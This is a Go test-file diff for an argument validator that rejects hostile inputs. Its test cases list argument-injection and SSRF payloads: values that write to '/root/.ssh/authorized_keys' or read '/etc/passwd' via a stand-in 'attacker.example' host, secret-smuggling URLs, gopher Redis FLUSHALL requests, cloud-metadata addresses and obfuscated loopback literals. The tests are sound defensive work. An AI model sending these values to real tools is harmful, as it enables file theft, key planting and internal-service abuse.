@@ -1,13 +1,36 @@
 package validator
 
 import (
+	"errors"
+	"net/netip"
 	"strings"
 	"testing"
 
 	"github.com/thirdkeyai/toolclad/pkg/manifest"
 )
 
-func intPtr(v int) *int         { return &v }
+// stubResolver replaces the DNS seam for the duration of the test with a
+// fixed answer table (host -> addresses). Names absent from the table fail
+// to resolve. Tests never depend on live DNS: every positive hostname case
+// under block_internal goes through this stub.
+func stubResolver(t *testing.T, table map[string][]string) {
+	t.Helper()
+	prev := lookupHost
+	lookupHost = func(host string) ([]netip.Addr, error) {
+		ips, ok := table[strings.ToLower(host)]
+		if !ok {
+			return nil, errors.New("stub resolver: no such host")
+		}
+		addrs := make([]netip.Addr, 0, len(ips))
+		for _, ip := range ips {
+			addrs = append(addrs, netip.MustParseAddr(ip).Unmap())
+		}
+		return addrs, nil
+	}
+	t.Cleanup(func() { lookupHost = prev })
+}
+
+func intPtr(v int) *int           { return &v }
 func floatPtr(v float64) *float64 { return &v }
 
 func TestValidateArg(t *testing.T) {
@@ -559,7 +582,10 @@ func TestNumberType(t *testing.T) {
 		wantErr bool
 	}{
 		{"valid float", &manifest.ArgDef{Name: "n", Type: "number"}, "0.5", false},
-		{"negative", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", false},
+		// A negative output starts with '-' and is rejected by the
+		// leading-dash rule unless the arg opts in.
+		{"negative rejected by leading-dash rule", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", true},
+		{"negative with allow_leading_dash", &manifest.ArgDef{Name: "n", Type: "number", AllowLeadingDash: true}, "-3.14", false},
 		{"NaN rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "NaN", true},
 		{"Inf rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "Inf", true},
 		{"non-numeric", &manifest.ArgDef{Name: "n", Type: "number"}, "abc", true},
@@ -665,5 +691,1026 @@ func TestCheckInjection(t *testing.T) {
 				t.Errorf("unexpected error: %v", err)
 			}
 		})
+	}
+}
+
+// TC-1: argument values that smuggle extra options through quoting or
+// whitespace must be rejected outright by the string-derived hygiene rules.
+func TestTC1PayloadsRejected(t *testing.T) {
+	cases := []struct{ typ, value string }{
+		{"string", "' -d @/etc/passwd"},
+		{"string", "X: y' -d @/etc/passwd -H 'Z: w"},
+		{"url", "https://attacker.example/ -o /root/.ssh/authorized_keys"},
+		{"url", "https://attacker.example/ -o /tmp/pwned"},
+	}
+	for _, c := range cases {
+		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
+			def := &manifest.ArgDef{Name: "v", Type: c.typ}
+			if got, err := ValidateArg(def, c.value); err == nil {
+				t.Fatalf("template mode: expected rejection, got %q", got)
+			}
+			// Opting in to whitespace in exec mode must not rescue these:
+			// quotes stay banned and url never allows whitespace.
+			def.AllowWhitespace = true
+			if got, err := ValidateArgMode(def, c.value, true); err == nil {
+				t.Fatalf("exec mode with allow_whitespace: expected rejection, got %q", got)
+			}
+		})
+	}
+}
+
+// TC-2: option-looking values must never reach the tool as options.
+func TestTC2PayloadsRejected(t *testing.T) {
+	values := []string{
+		"-iL /etc/passwd",
+		"--script=/tmp/evil.nse",
+		"--script http-fetch --script-args http-fetch.destination=/tmp/d",
+	}
+	for _, v := range values {
+		t.Run(v, func(t *testing.T) {
+			def := &manifest.ArgDef{Name: "v", Type: "string"}
+			if got, err := ValidateArg(def, v); err == nil {
+				t.Fatalf("expected rejection, got %q", got)
+			}
+			def.AllowWhitespace = true
+			if got, err := ValidateArgMode(def, v, true); err == nil {
+				t.Fatalf("exec mode with allow_whitespace: expected rejection (leading dash), got %q", got)
+			}
+		})
+	}
+}
+
+// TC-3: the leading-dash rule across types, and the allow_leading_dash opt-in.
+func TestTC3LeadingDashRejected(t *testing.T) {
+	const msg = "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+	cases := []struct{ typ, value string }{
+		{"path", "-rf"},
+		{"string", "--output=/etc/cron.d/x"},
+		{"integer", "-1"},
+		{"string", "+short"},
+		{"number", "-0.5"},
+		{"duration", "-5"},
+		{"msf_options", "-RHOSTS 10.0.0.1"},
+	}
+	for _, c := range cases {
+		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
+			_, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: c.typ}, c.value)
+			if err == nil {
+				t.Fatalf("expected rejection")
+			}
+			if !strings.Contains(err.Error(), msg) {
+				t.Fatalf("error %q does not contain %q", err.Error(), msg)
+			}
+		})
+	}
+
+	got, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: "string", AllowLeadingDash: true}, "-v")
+	if err != nil || got != "-v" {
+		t.Errorf("allow_leading_dash should permit -v, got %q, %v", got, err)
+	}
+	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", AllowLeadingDash: true}, "-1")
+	if err != nil || got != "-1" {
+		t.Errorf("allow_leading_dash should permit -1, got %q, %v", got, err)
+	}
+	// The numeric rule applies to the output value: clamping to a
+	// non-negative minimum rescues a negative input.
+	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", Min: intPtr(1), Clamp: true}, "-5")
+	if err != nil || got != "1" {
+		t.Errorf("clamped negative should yield 1, got %q, %v", got, err)
+	}
+}
+
+func TestValueHygiene(t *testing.T) {
+	str := func(allowWS bool) *manifest.ArgDef {
+		return &manifest.ArgDef{Name: "v", Type: "string", AllowWhitespace: allowWS}
+	}
+	tests := []struct {
+		name     string
+		def      *manifest.ArgDef
+		value    string
+		execMode bool
+		wantErr  string
+		want     string
+	}{
+		{name: "NUL in enum", def: &manifest.ArgDef{Name: "v", Type: "enum", Allowed: []string{"syn\x00"}}, value: "syn\x00", wantErr: "must not contain NUL bytes"},
+		{name: "NUL in integer", def: &manifest.ArgDef{Name: "v", Type: "integer"}, value: "1\x00", wantErr: "must not contain NUL bytes"},
+		{name: "NUL in boolean", def: &manifest.ArgDef{Name: "v", Type: "boolean"}, value: "true\x00", wantErr: "must not contain NUL bytes"},
+		{name: "control char", def: str(false), value: "a\x01b", wantErr: "must not contain control characters"},
+		{name: "DEL", def: str(false), value: "a\x7fb", wantErr: "must not contain control characters"},
+		{name: "tab without opt-in", def: str(false), value: "a\tb", wantErr: "must not contain control characters"},
+		{name: "double quote", def: str(false), value: `a"b`, wantErr: "must not contain quote or backslash characters"},
+		{name: "single quote", def: str(false), value: "a'b", wantErr: "must not contain quote or backslash characters"},
+		{name: "backslash", def: str(false), value: `a\b`, wantErr: "must not contain quote or backslash characters"},
+		{name: "scope_target backslash keeps specific message", def: &manifest.ArgDef{Name: "v", Type: "scope_target"}, value: `a\b`, wantErr: "backslash escape sequences"},
+		{name: "space", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
+		{name: "nbsp", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace ignored in template mode", def: str(true), value: "a b", execMode: false, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace honored in exec mode", def: str(true), value: "a b", execMode: true, want: "a b"},
+		// allow_whitespace permits only the ASCII space; control characters
+		// are rejected unconditionally and exotic spaces stay rejected.
+		{name: "allow_whitespace tab still rejected", def: str(true), value: "a\tb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace newline still rejected", def: str(true), value: "a\nb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace CR still rejected", def: str(true), value: "a\rb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace vertical tab still rejected", def: str(true), value: "a\vb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace form feed still rejected", def: str(true), value: "a\fb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace nbsp still rejected", def: str(true), value: "a\u00a0b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace line separator still rejected", def: str(true), value: "a\u2028b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace ideographic space still rejected", def: str(true), value: "a\u3000b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "C1 control rejected", def: str(true), value: "a\u0085b", execMode: true, wantErr: "must not contain control characters"},
+		{name: "msf_options tab rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\t10.0.0.1", wantErr: "must not contain control characters"},
+		{name: "msf_options nbsp rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\u00a010.0.0.1", wantErr: "must not contain whitespace"},
+		{name: "url never allows whitespace", def: &manifest.ArgDef{Name: "v", Type: "url", AllowWhitespace: true}, value: "https://example.com/a b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "msf_options exempt from whitespace rule", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 10.0.0.1", want: "RHOSTS 10.0.0.1"},
+		{name: "msf_options still rejects quotes", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 'x'", wantErr: "must not contain quote or backslash characters"},
+		{name: "path with space rejected", def: &manifest.ArgDef{Name: "v", Type: "path"}, value: "my file.txt", wantErr: "must not contain whitespace"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := ValidateArgMode(tt.def, tt.value, tt.execMode)
+			if tt.wantErr != "" {
+				if err == nil {
+					t.Fatalf("expected error containing %q, got value %q", tt.wantErr, got)
+				}
+				if !strings.Contains(err.Error(), tt.wantErr) {
+					t.Fatalf("error %q does not contain %q", err.Error(), tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if got != tt.want {
+				t.Errorf("got %q, want %q", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestPatternAnchoring(t *testing.T) {
+	str := &manifest.ArgDef{Name: "v", Type: "string", Pattern: "[a-z]+"}
+	if _, err := ValidateArg(str, "abc123"); err == nil {
+		t.Error("unanchored pattern [a-z]+ must reject abc123")
+	}
+	if got, err := ValidateArg(str, "abc"); err != nil || got != "abc" {
+		t.Errorf("pattern [a-z]+ should accept abc, got %q, %v", got, err)
+	}
+	rm := &manifest.ArgDef{Name: "v", Type: "regex_match", Pattern: "[a-z]+"}
+	if _, err := ValidateArg(rm, "abc123"); err == nil {
+		t.Error("regex_match with [a-z]+ must reject abc123")
+	}
+	custom := map[string]*manifest.CustomTypeDef{"lower": {Base: "string", Pattern: "[a-z]+"}}
+	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "abc123", custom); err == nil {
+		t.Error("custom type pattern [a-z]+ must reject abc123")
+	}
+	// Custom types go through hygiene too.
+	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "-abc", custom); err == nil {
+		t.Error("custom type must apply the leading-dash rule")
+	}
+}
+
+func TestAnchorPattern(t *testing.T) {
+	cases := map[string]string{
+		"[a-z]+":   "^(?:[a-z]+)$",
+		"^[a-z]+$": "^(?:[a-z]+)$",
+		"^abc":     "^(?:abc)$",
+		"abc$":     "^(?:abc)$",
+		`a\$`:      `^(?:a\$)$`,
+		`a\\$`:     `^(?:a\\)$`,
+	}
+	for in, want := range cases {
+		if got := AnchorPattern(in); got != want {
+			t.Errorf("AnchorPattern(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// urlVector mirrors one `url-` entry of the shared injection-vector suite.
+// The values are asserted inline here; the shared file is wired in later.
+type urlVector struct {
+	id            string
+	schemes       []string
+	blockInternal bool
+	value         string
+	accept        bool
+}
+
+var urlVectors = []urlVector{
+	{id: "url-space-option-injection", value: "https://attacker.example/ -o /root/.ssh/authorized_keys"},
+	{id: "url-space-write-tmp", value: "https://attacker.example/ -o /tmp/pwned"},
+	{id: "url-secret-smuggling", value: "https://attacker.example/?k={_secret:api_key}"},
+	{id: "url-javascript-scheme", value: "javascript:alert(1)"},
+	{id: "url-file-scheme", value: "file:///etc/passwd"},
+	{id: "url-data-scheme", value: "data:text/html,<script>1</script>"},
+	{id: "url-gopher-redis", value: "gopher://127.0.0.1:6379/_FLUSHALL"},
+	{id: "url-dict-scheme", value: "dict://127.0.0.1:11211/stat"},
+	{id: "url-userinfo", value: "http://user:pw@example.com/"},
+	{id: "url-metacharacter", value: "https://attacker.example/;id"},
+	{id: "url-scheme-not-in-list", schemes: []string{"https"}, value: "http://example.com/"},
+	{id: "url-imds-always-blocked", value: "http://169.254.169.254/latest/meta-data/"},
+	{id: "url-docker-socket-block-internal", blockInternal: true, value: "http://127.0.0.1:2375/containers/json"},
+	{id: "url-ipv6-loopback-block-internal", blockInternal: true, value: "http://[::1]:8080/"},
+	{id: "url-accept", value: "https://example.com/path", accept: true},
+	{id: "url-accept-public-ip-block-internal", blockInternal: true, value: "https://93.184.216.34/x", accept: true},
+}
+
+func TestURLVectors(t *testing.T) {
+	for _, v := range urlVectors {
+		t.Run(v.id, func(t *testing.T) {
+			def := &manifest.ArgDef{Name: "u", Type: "url", Schemes: v.schemes, BlockInternal: v.blockInternal}
+			got, err := ValidateArg(def, v.value)
+			if v.accept {
+				if err != nil {
+					t.Fatalf("expected accept, got error: %v", err)
+				}
+				if got != v.value {
+					t.Fatalf("value must pass through unchanged: got %q", got)
+				}
+				return
+			}
+			if err == nil {
+				t.Fatalf("expected rejection, got %q", got)
+			}
+		})
+	}
+}
+
+func TestURLSchemes(t *testing.T) {
+	// The default allowlist is http and https; anything else is refused
+	// even though the shipped manifests never set `schemes`.
+	def := &manifest.ArgDef{Name: "u", Type: "url"}
+	for _, v := range []string{
+		"gopher://127.0.0.1:6379/_FLUSHALL",
+		"file://localhost/etc/passwd",
+		"ftp://example.com/x",
+		"ldap://example.com/x",
+		"wss://example.com/x",
+		"example.com",
+		"example.com/path",
+		"://example.com/",
+	} {
+		if _, err := ValidateArg(def, v); err == nil {
+			t.Errorf("%q: expected rejection", v)
+		}
+	}
+	for _, v := range []string{"http://example.com/", "HTTPS://example.com/", "https://example.com"} {
+		if _, err := ValidateArg(def, v); err != nil {
+			t.Errorf("%q: unexpected error: %v", v, err)
+		}
+	}
+
+	// schemes narrows the allowlist, case-insensitively.
+	httpsOnly := &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"HTTPS"}}
+	if _, err := ValidateArg(httpsOnly, "http://example.com/"); err == nil || !strings.Contains(err.Error(), "not in allowed schemes") {
+		t.Errorf("schemes=[https] must reject http, got %v", err)
+	}
+	if _, err := ValidateArg(httpsOnly, "https://example.com/"); err != nil {
+		t.Errorf("schemes=[https] must accept https: %v", err)
+	}
+
+	// A denied scheme stays denied even when a manifest lists it, with its
+	// own message.
+	listed := &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https", "file", "gopher"}}
+	for _, v := range []string{"file://localhost/etc/passwd", "gopher://127.0.0.1:6379/_FLUSHALL"} {
+		_, err := ValidateArg(listed, v)
+		if err == nil || !strings.Contains(err.Error(), "is never permitted") {
+			t.Errorf("%q: listed denied scheme must still be refused with the dedicated message, got %v", v, err)
+		}
+	}
+	if _, err := ValidateArg(listed, "https://example.com/"); err != nil {
+		t.Errorf("listed https must still pass: %v", err)
+	}
+}
+
+func TestURLPorts(t *testing.T) {
+	def := &manifest.ArgDef{Name: "u", Type: "url"}
+	for _, v := range []string{"https://example.com:8443/x", "https://example.com:1/", "https://example.com:65535"} {
+		if _, err := ValidateArg(def, v); err != nil {
+			t.Errorf("%q: unexpected error: %v", v, err)
+		}
+	}
+	for _, v := range []string{
+		"https://example.com:0/x",
+		"https://example.com:99999/x",
+		"https://example.com:65536/",
+		"https://example.com:/x",
+		"https://example.com:8a/x",
+		"https://example.com:+1/x",
+	} {
+		if _, err := ValidateArg(def, v); err == nil {
+			t.Errorf("%q: expected rejection", v)
+		}
+	}
+}
+
+func TestURLBlockInternal(t *testing.T) {
+	stubResolver(t, map[string][]string{"example.com": {"93.184.216.34"}})
+	open := &manifest.ArgDef{Name: "u", Type: "url"}
+	blocking := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: true}
+
+	// Loopback is allowed only when block_internal is off.
+	if _, err := ValidateArg(open, "http://127.0.0.1/"); err != nil {
+		t.Errorf("loopback without block_internal must pass: %v", err)
+	}
+	for _, v := range []string{
+		"http://127.0.0.1/",
+		"http://[::1]:8080/",
+		"http://10.0.0.5/x",
+		"http://192.168.1.1:8080/",
+		"http://172.16.0.1/",
+		"http://100.64.0.1/",
+		"http://0.0.0.0/",
+		"http://[::ffff:127.0.0.1]/",
+		"http://[fc00::1]/",
+		"http://[2001:db8::1]/",
+	} {
+		if _, err := ValidateArg(blocking, v); err == nil {
+			t.Errorf("%q: block_internal must reject", v)
+		}
+	}
+	if _, err := ValidateArg(blocking, "https://93.184.216.34/x"); err != nil {
+		t.Errorf("public literal under block_internal must pass: %v", err)
+	}
+	if _, err := ValidateArg(blocking, "https://example.com/"); err != nil {
+		t.Errorf("hostname resolving to a public address under block_internal must pass: %v", err)
+	}
+}
+
+func TestURLIMDSAlwaysBlocked(t *testing.T) {
+	for _, blockInternal := range []bool{false, true} {
+		def := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: blockInternal}
+		for _, v := range []string{
+			"http://169.254.169.254/latest/meta-data/",
+			"http://169.254.0.1/",
+			"http://[::ffff:169.254.169.254]/latest/meta-data/",
+			"http://[fe80::1]/",
+		} {
+			_, err := ValidateArg(def, v)
+			if err == nil {
+				t.Errorf("block_internal=%v %q: expected rejection", blockInternal, v)
+				continue
+			}
+			// The bracketed forms are caught by the metacharacter blocklist
+			// first; the dotted form must carry the always-blocked wording.
+			if !strings.Contains(v, "[") && !strings.Contains(err.Error(), "always blocked") {
+				t.Errorf("block_internal=%v %q: want always-blocked wording, got %v", blockInternal, v, err)
+			}
+		}
+	}
+	want := "validation error for 'u': target is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"
+	_, err := ValidateArg(&manifest.ArgDef{Name: "u", Type: "url"}, "http://169.254.169.254/")
+	if err == nil || err.Error() != want {
+		t.Errorf("want %q, got %v", want, err)
+	}
+}
+
+func TestURLHostHardening(t *testing.T) {
+	def := &manifest.ArgDef{Name: "u", Type: "url"}
+	cases := []struct{ value, wantSub string }{
+		{"http://0x7f000001/", "non-canonical IP literal"},
+		{"http://2130706433/", "non-canonical IP literal"},
+		{"http://0177.0.0.1/", "non-canonical IP literal"},
+		{"http://127.1/", "non-canonical IP literal"},
+		{"http://xn--example-9c.com/", "punycode"},
+		{"http://XN--example-9c.com/", "punycode"},
+		{"http://user:pw@example.com/", "userinfo"},
+		{"http://example.com?x=a@b", "userinfo"},
+		{"http:///path", "host must not be empty"},
+		{"http://", "host must not be empty"},
+		{"http://:8080/", "host must not be empty"},
+		{"http://::1/", "not a valid hostname"},
+		{"http://example.123/", "not a valid hostname"},
+		{"http://exa_mple.com/", "not a valid hostname"},
+		{"example.com", "expected scheme://host"},
+	}
+	for _, c := range cases {
+		_, err := ValidateArg(def, c.value)
+		if err == nil {
+			t.Errorf("%q: expected rejection", c.value)
+			continue
+		}
+		if !strings.Contains(err.Error(), c.wantSub) {
+			t.Errorf("%q: error %q does not contain %q", c.value, err.Error(), c.wantSub)
+		}
+	}
+	for _, v := range []string{"http://93.184.216.34/x", "https://example.com/path?q=1#frag", "https://sub.example.com"} {
+		if _, err := ValidateArg(def, v); err != nil {
+			t.Errorf("%q: unexpected error: %v", v, err)
+		}
+	}
+}
+
+// The public entry point refuses "[" and "]" through the metacharacter
+// blocklist before the structural parse runs, so the bracketed-IPv6 path is
+// covered directly here.
+func TestSplitURLHostPort(t *testing.T) {
+	good := []struct{ in, host, port string }{
+		{"example.com", "example.com", ""},
+		{"example.com:8443", "example.com", "8443"},
+		{"93.184.216.34:80", "93.184.216.34", "80"},
+		{"[::1]", "::1", ""},
+		{"[::1]:8080", "::1", "8080"},
+		{"[2001:db8::1]:443", "2001:db8::1", "443"},
+		{"[::ffff:169.254.169.254]", "::ffff:169.254.169.254", ""},
+	}
+	for _, c := range good {
+		host, port, err := splitURLHostPort(c.in)
+		if err != nil {
+			t.Errorf("%q: unexpected error: %v", c.in, err)
+			continue
+		}
+		if host != c.host || port != c.port {
+			t.Errorf("%q: got (%q, %q), want (%q, %q)", c.in, host, port, c.host, c.port)
+		}
+	}
+	bad := []string{"", ":8080", "example.com:", "[::1]:", "[::1", "[example.com]", "[::1]x", "[::1]8080", "[fe80::1%eth0]", "[127.0.0.1]"}
+	for _, in := range bad {
+		if host, port, err := splitURLHostPort(in); err == nil {
+			t.Errorf("%q: expected error, got (%q, %q)", in, host, port)
+		}
+	}
+}
+
+func TestScopeTargetBlockInternal(t *testing.T) {
+	stubResolver(t, map[string][]string{"example.com": {"93.184.216.34"}})
+	open := &manifest.ArgDef{Name: "t", Type: "scope_target"}
+	blocking := &manifest.ArgDef{Name: "t", Type: "scope_target", BlockInternal: true}
+
+	// Default policy is permissive for loopback/private so tools that
+	// legitimately target internal hosts keep working without opt-in.
+	for _, v := range []string{"127.0.0.1", "10.0.0.5", "::1", "10.0.0.0/24"} {
+		if _, err := ValidateArg(open, v); err != nil {
+			t.Errorf("%q without block_internal must pass: %v", v, err)
+		}
+	}
+	// ...but link-local / cloud metadata is blocked unconditionally.
+	for _, v := range []string{"169.254.169.254", "169.254.0.1", "::ffff:169.254.169.254", "fe80::1", "169.254.0.0/16", "fe80::/10"} {
+		_, err := ValidateArg(open, v)
+		if err == nil || !strings.Contains(err.Error(), "always blocked") {
+			t.Errorf("%q: want always-blocked rejection, got %v", v, err)
+		}
+	}
+
+	for _, v := range []string{
+		"127.0.0.1",
+		"10.0.0.5",
+		"192.168.1.1",
+		"172.31.255.254",
+		"100.64.0.1",
+		"169.254.169.254",
+		"0.0.0.0",
+		"255.255.255.255",
+		"192.0.2.1",
+		"198.51.100.7",
+		"203.0.113.9",
+		"198.18.0.1",
+		"240.0.0.1",
+		"::1",
+		"::",
+		"fc00::1",
+		"fd12::1",
+		"fe80::1",
+		"2001:db8::1",
+		"::ffff:127.0.0.1",
+		"::ffff:10.0.0.1",
+		"10.0.0.0/24",
+		"192.168.0.0/16",
+	} {
+		if _, err := ValidateArg(blocking, v); err == nil {
+			t.Errorf("%q: block_internal must reject", v)
+		}
+	}
+	want := "validation error for 't': target resolves to a private address (blocked by block_internal policy)"
+	if _, err := ValidateArg(blocking, "10.0.0.5"); err == nil || err.Error() != want {
+		t.Errorf("want %q, got %v", want, err)
+	}
+	for _, v := range []string{"93.184.216.34", "example.com", "8.8.8.0/24", "2606:4700::1111"} {
+		if _, err := ValidateArg(blocking, v); err != nil {
+			t.Errorf("%q under block_internal must pass: %v", v, err)
+		}
+	}
+}
+
+func TestScopeTargetRejectsObfuscatedIPLiterals(t *testing.T) {
+	// A libc resolver expands all of these to 127.0.0.1 — they must not
+	// pass as canonical IPs or sneak through as "hostnames".
+	def := &manifest.ArgDef{Name: "t", Type: "scope_target"}
+	for _, v := range []string{
+		"2130706433", // decimal integer
+		"0x7f000001", // hex
+		"0X7F000001", // hex, upper case
+		"0177.0.0.1", // octal-leading
+		"127.1",      // shorthand
+		"010.0.0.1",  // leading-zero octet
+		"1.2.3",      // three all-numeric labels
+	} {
+		_, err := ValidateArg(def, v)
+		if err == nil {
+			t.Errorf("%q: expected rejection", v)
+			continue
+		}
+		if !strings.Contains(err.Error(), "non-canonical IP literal") {
+			t.Errorf("%q: want non-canonical wording, got %v", v, err)
+		}
+	}
+	// Other resolver-expandable or structurally invalid shapes.
+	for _, v := range []string{"example.123", "127.0.0.1.", "example.com.", "fe80::1%eth0", "::ffff:010.0.0.1"} {
+		if _, err := ValidateArg(def, v); err == nil {
+			t.Errorf("%q: expected rejection", v)
+		}
+	}
+	// Canonical forms still pass (no block_internal policy here).
+	for _, v := range []string{"127.0.0.1", "93.184.216.34", "::1", "::ffff:127.0.0.1", "example.com", "a1.b2.example"} {
+		if _, err := ValidateArg(def, v); err != nil {
+			t.Errorf("%q: unexpected error: %v", v, err)
+		}
+	}
+}
+
+func TestIPAddressAndCIDRPolicy(t *testing.T) {
+	ipOpen := &manifest.ArgDef{Name: "ip", Type: "ip_address"}
+	ipBlocking := &manifest.ArgDef{Name: "ip", Type: "ip_address", BlockInternal: true}
+	for _, v := range []string{"169.254.169.254", "::ffff:169.254.169.254", "fe80::1"} {
+		for _, def := range []*manifest.ArgDef{ipOpen, ipBlocking} {
+			_, err := ValidateArg(def, v)
+			if err == nil || !strings.Contains(err.Error(), "always blocked") {
+				t.Errorf("ip_address %q block_internal=%v: want always-blocked, got %v", v, def.BlockInternal, err)
+			}
+		}
+	}
+	if _, err := ValidateArg(ipOpen, "127.0.0.1"); err != nil {
+		t.Errorf("ip_address loopback without block_internal must pass: %v", err)
+	}
+	for _, v := range []string{"127.0.0.1", "10.1.2.3", "::1", "::ffff:10.0.0.1", "fc00::1"} {
+		_, err := ValidateArg(ipBlocking, v)
+		if err == nil || !strings.Contains(err.Error(), "blocked by block_internal policy") {
+			t.Errorf("ip_address %q: want block_internal rejection, got %v", v, err)
+		}
+	}
+	for _, v := range []string{"0x7f000001", "010.0.0.1", "127.1", "2130706433", "fe80::1%eth0", "1.2.3.4/24"} {
+		if _, err := ValidateArg(ipOpen, v); err == nil {
+			t.Errorf("ip_address %q: expected rejection", v)
+		}
+	}
+	if _, err := ValidateArg(ipBlocking, "93.184.216.34"); err != nil {
+		t.Errorf("ip_address public literal must pass: %v", err)
+	}
+
+	cidrOpen := &manifest.ArgDef{Name: "c", Type: "cidr"}
+	cidrBlocking := &manifest.ArgDef{Name: "c", Type: "cidr", BlockInternal: true}
+	for _, v := range []string{"169.254.0.0/16", "169.254.169.0/24", "fe80::/10"} {
+		for _, def := range []*manifest.ArgDef{cidrOpen, cidrBlocking} {
+			_, err := ValidateArg(def, v)
+			if err == nil || !strings.Contains(err.Error(), "always blocked") {
+				t.Errorf("cidr %q block_internal=%v: want always-blocked, got %v", v, def.BlockInternal, err)
+			}
+		}
+	}
+	if _, err := ValidateArg(cidrOpen, "10.0.0.0/8"); err != nil {
+		t.Errorf("cidr private without block_internal must pass: %v", err)
+	}
+	for _, v := range []string{"10.0.0.0/8", "192.168.1.0/24", "127.0.0.0/8", "2001:db8::/32", "fc00::/7"} {
+		_, err := ValidateArg(cidrBlocking, v)
+		if err == nil || !strings.Contains(err.Error(), "blocked by block_internal policy") {
+			t.Errorf("cidr %q: want block_internal rejection, got %v", v, err)
+		}
+	}
+	for _, v := range []string{"10.0.0.0/33", "010.0.0.0/8", "0x0a000000/8", "10.0.0.0", "10.0.0.0/"} {
+		if _, err := ValidateArg(cidrOpen, v); err == nil {
+			t.Errorf("cidr %q: expected rejection", v)
+		}
+	}
+	if _, err := ValidateArg(cidrBlocking, "8.8.8.0/24"); err != nil {
+		t.Errorf("cidr public range must pass: %v", err)
+	}
+}
+
+// One representative address per row of the range table, including the
+// IPv4-mapped IPv6 forms, checked against the exact reason wording.
+func TestHostPolicyRangeTable(t *testing.T) {
+	always := []struct{ addr, reason string }{
+		{"169.254.169.254", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
+		{"169.254.0.1", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
+		{"::ffff:169.254.169.254", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
+		{"fe80::1", "is an IPv6 link-local address (fe80::/10) — always blocked"},
+		{"febf::1", "is an IPv6 link-local address (fe80::/10) — always blocked"},
+	}
+	for _, c := range always {
+		addr, ok := parseCanonicalIP(c.addr)
+		if !ok {
+			t.Fatalf("%q did not parse", c.addr)
+		}
+		if got := alwaysBlockedIPReason(addr); got != c.reason {
+			t.Errorf("%q: got %q, want %q", c.addr, got, c.reason)
+		}
+	}
+	for _, v := range []string{"127.0.0.1", "10.0.0.1", "93.184.216.34", "::1", "fc00::1", "fec0::1"} {
+		addr, _ := parseCanonicalIP(v)
+		if got := alwaysBlockedIPReason(addr); got != "" {
+			t.Errorf("%q must not be always-blocked, got %q", v, got)
+		}
+	}
+
+	nonPublic := []struct{ addr, reason string }{
+		{"127.0.0.1", "resolves to a loopback address"},
+		{"127.255.255.254", "resolves to a loopback address"},
+		{"10.0.0.1", "resolves to a private address"},
+		{"172.16.0.1", "resolves to a private address"},
+		{"172.31.255.255", "resolves to a private address"},
+		{"192.168.0.1", "resolves to a private address"},
+		{"100.64.0.1", "is a carrier-grade NAT address (100.64.0.0/10)"},
+		{"100.127.255.255", "is a carrier-grade NAT address (100.64.0.0/10)"},
+		{"0.0.0.0", "is the unspecified address 0.0.0.0"},
+		{"0.1.2.3", "is the unspecified address 0.0.0.0"},
+		{"255.255.255.255", "is the broadcast address"},
+		{"192.0.2.1", "is a documentation-range address"},
+		{"198.51.100.1", "is a documentation-range address"},
+		{"203.0.113.1", "is a documentation-range address"},
+		{"198.18.0.1", "is a benchmarking-range address (198.18.0.0/15)"},
+		{"198.19.255.255", "is a benchmarking-range address (198.18.0.0/15)"},
+		{"240.0.0.1", "is a reserved-range address (240.0.0.0/4)"},
+		{"255.255.255.254", "is a reserved-range address (240.0.0.0/4)"},
+		{"::1", "resolves to the IPv6 loopback ::1"},
+		{"::", "is the IPv6 unspecified address ::"},
+		{"fc00::1", "is an IPv6 unique-local address (fc00::/7)"},
+		{"fdff::1", "is an IPv6 unique-local address (fc00::/7)"},
+		{"fe80::1", "is an IPv6 link-local address (fe80::/10)"},
+		{"2001:db8::1", "is an IPv6 documentation-range address (2001:db8::/32)"},
+		{"::ffff:127.0.0.1", "resolves to a loopback address"},
+		{"::ffff:10.0.0.1", "resolves to a private address"},
+		{"::ffff:192.168.1.1", "resolves to a private address"},
+		{"::ffff:0.0.0.0", "is the unspecified address 0.0.0.0"},
+		{"::ffff:255.255.255.255", "is the broadcast address"},
+		{"::ffff:192.0.2.1", "is a documentation-range address"},
